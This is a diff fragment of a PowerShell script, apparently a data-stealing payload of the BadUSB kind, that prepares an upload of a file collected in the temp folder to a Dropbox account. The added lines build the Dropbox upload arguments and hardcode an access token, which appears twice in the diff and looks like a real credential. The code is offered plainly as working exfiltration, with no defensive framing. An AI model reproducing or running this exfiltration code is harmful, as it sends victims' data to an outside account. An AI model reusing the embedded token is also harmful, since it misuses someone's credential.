@@ -33,7 +33,7 @@
 
 ############################################################################################################################################################
 
-$DropBoxAccessToken = sl.BV3xvp3EYGBSbf1FuACOjWhQ0H7ZwaasEApA0-kKwTYjAjWL6KTe8avYSejuQd8MRM9V3AMVxuFvNQIuQCecfs0ptmGKYzMptglCoTKeTA6ZV1C7U0FQ4629JPuX8rk4-63NrSue
+#$DropBoxAccessToken = "sl.BV3xvp3EYGBSbf1FuACOjWhQ0H7ZwaasEApA0-kKwTYjAjWL6KTe8avYSejuQd8MRM9V3AMVxuFvNQIuQCecfs0ptmGKYzMptglCoTKeTA6ZV1C7U0FQ4629JPuX8rk4-63NrSue"
 ############################################################################################################################################################
 
  function Get-fullName {
@@ -369,6 +369,10 @@ vault -ErrorAction SilentlyContinue -Force
 
 $TargetFilePath="/$FileName"
 $SourceFilePath="$env:TMP\$FileName"
+$arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
+$DropBoxAccessToken = "sl.BV3xvp3EYGBSbf1FuACOjWhQ0H7ZwaasEApA0-kKwTYjAjWL6KTe8avYSejuQd8MRM9V3AMVxuFvNQIuQCecfs0ptmGKYzMptglCoTKeTA6ZV1C7U0FQ4629JPuX8rk4-63NrSue"   # Replace with your DropBox Access Token
+$outputFile = Split-Path $SourceFilePath -leaf
+$TargetFilePath="/$outputFile"
 $arg = '{ "path": "' + $TargetFilePath + '", "mode": "add", "autorename": true, "mute": false }'
 $authorization = "Bearer " + $DropBoxAccessToken
 $headers = New-Object "System.Collections.Generic.Dictionary[[String],[String]]"
